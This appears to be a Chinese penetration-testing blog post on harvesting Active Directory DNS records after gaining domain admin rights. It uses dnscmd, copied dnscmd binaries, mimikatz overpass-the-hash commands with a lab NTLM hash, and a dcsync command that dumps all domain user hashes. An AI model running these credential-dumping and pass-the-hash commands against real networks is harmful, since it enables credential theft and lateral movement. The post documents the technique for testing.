@@ -1,0 +1,238 @@
+I""<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在域渗透中，对域环境的信息搜集很关键，如果我们获得了域内管理员的权限，那么如何能够快速了解域内的网络架构呢？DNS记录无疑是一个很好的参考。</p>
+
+<p>本文将要介绍在域渗透中，获得DNS管理员权限后，获取DNS记录的方法</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>通过DNS Manager获取DNS记录</li>
+  <li>通过dnscmd获取DNS记录</li>
+  <li>域内远程读取DNS记录的方法</li>
+</ul>
+
+<h2 id="0x02-通过dns-manager获取dns记录">0x02 通过DNS Manager获取DNS记录</h2>
+<hr />
+
+<p>测试系统：</p>
+
+<p>Windows Server 2008 R2 x64</p>
+
+<p>选择<code class="language-plaintext highlighter-rouge">Administrative Tools</code> -&gt; <code class="language-plaintext highlighter-rouge">DNS</code></p>
+
+<p>在<code class="language-plaintext highlighter-rouge">Forward Lookup Zones</code>下找到当前域名，能够显示当前域内的DNS记录，包括主机名和对应的IP</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/2-1.png" alt="Alt text" /></p>
+
+<h2 id="0x03-通过dnscmd获取dns记录">0x03 通过dnscmd获取DNS记录</h2>
+<hr />
+
+<p>dnscmd：</p>
+
+<p>用来管理DNS服务器的命令行接口，支持远程连接</p>
+
+<p>默认安装的系统：</p>
+
+<ul>
+  <li>Windows Server 2003</li>
+  <li>Windows Server 2008</li>
+  <li>Windows Server 2003 R2</li>
+  <li>Windows Server 2008 R2</li>
+  <li>Windows Server 2012</li>
+  <li>Windows Server 2003 with SP1</li>
+  <li>…</li>
+</ul>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc772069(v=ws.11)</p>
+
+<p>Win7系统在使用时需要安装Remote Server Administration Tools (RSAT)</p>
+
+<p>参考地址：</p>
+
+<p>https://support.microsoft.com/en-us/help/2693643/remote-server-administration-tools-rsat-for-windows-operating-systems</p>
+
+<p>RSAT下载地址：</p>
+
+<p>https://www.microsoft.com/en-us/download/details.aspx?id=7887</p>
+
+<p>测试系统：</p>
+
+<p>Windows Server 2008 R2 x64</p>
+
+<p>常用命令:</p>
+
+<h4 id="1列出dns区域中当前节点的资源记录">(1)列出DNS区域中当前节点的资源记录：</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /EnumZones
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-1.png" alt="Alt text" /></p>
+
+<h4 id="2列出testcom的信息">(2)列出test.com的信息：</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /ZoneInfo test.com
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-2.png" alt="Alt text" /></p>
+
+<h4 id="3列举testcom中的记录方法1更详细">(3)列举test.com中的记录，方法1(更详细)：</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /ZonePrint test.com
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-3.png" alt="Alt text" /></p>
+
+<h4 id="4列举testccom的记录方法2">(4)列举testc.com的记录，方法2：</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /EnumRecords test.com .
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-4.png" alt="Alt text" /></p>
+
+<p>结果同DNS Manager获取的记录一致</p>
+
+<h2 id="0x04-域内远程读取dns记录的方法">0x04 域内远程读取DNS记录的方法</h2>
+<hr />
+
+<h3 id="方法分析">方法分析</h3>
+
+<p>前提需要获得域管理员的权限</p>
+
+<p>第一种方法是先远程连接域控制器，然后在域控制器上执行dnscmd获取DNS记录</p>
+
+<p>第二种方法是在域内一台主机上面，执行dnscmd远程读取DNS记录</p>
+
+<p>但是Win7系统默认不支持dnscmd，直接安装Remote Server Administration Tools (RSAT)也不现实</p>
+
+<p>于是，我尝试寻找在未安装Remote Server Administration Tools (RSAT)的系统上执行dnscmd的方法</p>
+
+<h3 id="方法测试">方法测试</h3>
+
+<p>向未安装Remote Server Administration Tools (RSAT)的Win7系统上复制一个dnscmd.exe，直接执行，结果失败</p>
+
+<h3 id="解决方法">解决方法</h3>
+
+<p>通过Process Monitor记录dnscmd的执行过程，查看缺少哪些文件</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/4-1.png" alt="Alt text" /></p>
+
+<p>发现缺少文件dnscmd.exe.mui</p>
+
+<p>补全缺少的文件，再次测试，最终找到解决方法</p>
+
+<p>在未安装Remote Server Administration Tools (RSAT)的系统上执行dnscmd，需要满足以下条件：</p>
+
+<ol>
+  <li>dnscmd保存在路径<code class="language-plaintext highlighter-rouge">C:\Windows\System32</code>下</li>
+  <li>dnscmd.exe.mui保存在<code class="language-plaintext highlighter-rouge">C:\Windows\System32\en-US</code>下(该位置比较通用，也可以在其他位置)</li>
+</ol>
+
+<p><strong>注：</strong></p>
+
+<p>dnscmd和dnscmd.exe.mui使用Windows Server 2008 R2下的即可</p>
+
+<p>这里提供一个测试文件(我从Windows Server 2008 R2下获得的)：</p>
+
+<p>https://github.com/3gstudent/test/blob/master/dnscmd.exe</p>
+
+<p>https://github.com/3gstudent/test/blob/master/dnscmd.exe.mui</p>
+
+<p><strong>注：</strong></p>
+
+<p>仅供测试</p>
+
+<p>由于dnscmd在远程连接时，未提供输入用户名和口令的接口，这里需要借助mimikatz的Overpass-the-hash</p>
+
+<p>首先需要获得域管理员用户的hash，这里只能用ntlm/rc4/aes128/aes256</p>
+
+<p>如果获得了域管理员用户的明文口令，可以先将明文转为ntlm，在线加密的网站：</p>
+
+<p>https://md5decrypt.net/en/Ntlm/</p>
+
+<p>补充：使用dcsync获得域内所有用户hash的方法</p>
+
+<p>域控制器上执行mimikatz:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.local /all /csv exit"
+</code></pre></div></div>
+
+<h3 id="实际测试">实际测试</h3>
+
+<p>测试环境的参数如下：</p>
+
+<ul>
+  <li>域管理员用户：Administrator</li>
+  <li>口令：DomainAdmin456!</li>
+  <li>hash：A55E0720F0041193632A58E007624B40</li>
+</ul>
+
+<p>Overpass-the-hash:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40"
+</code></pre></div></div>
+
+<p>这样会弹出一个cmd.exe</p>
+
+<p>接着使用dnscmd远程连接进行查询：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd WIN-F08C969D7FM.test.com /EnumZones
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd WIN-F08C969D7FM /EnumZones
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>这里要使用FQDN或者计算机名</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/4-2.png" alt="Alt text" /></p>
+
+<p>如果想在命令行下实现整个流程，可以采用如下方法：</p>
+
+<p>新建<code class="language-plaintext highlighter-rouge">c:\test\1.bat</code>，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd WIN-F08C969D7FM.test.com /EnumZones &gt; c:\test\out.txt
+</code></pre></div></div>
+
+<p>Overpass-the-hash:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40 /run:\"cmd.exe /c c:\test\1.bat\""
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>cmd.exe下<code class="language-plaintext highlighter-rouge">"</code>需要使用转义字符<code class="language-plaintext highlighter-rouge">\"</code></p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文介绍了在域内使用Overpass-the-hash实现dnscmd远程读取DNS记录的方法</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
